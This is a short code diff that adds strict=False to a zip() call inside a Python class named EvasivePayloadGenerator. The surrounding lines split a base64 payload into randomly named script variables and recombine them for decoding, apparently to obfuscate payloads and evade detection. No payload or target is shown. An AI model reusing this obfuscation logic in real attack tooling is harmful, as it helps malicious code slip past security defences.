@@ -167,7 +167,7 @@ class EvasivePayloadGenerator:
             chunks = [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]
             chunk_vars = [self._random_var(6) for _ in chunks]
             chunk_assignments = ";".join(
-                f"${v}='{c}'" for v, c in zip(chunk_vars, chunks)
+                f"${v}='{c}'" for v, c in zip(chunk_vars, chunks, strict=False)
             )
             combined = "+".join(f"${v}" for v in chunk_vars)
             decoder = (
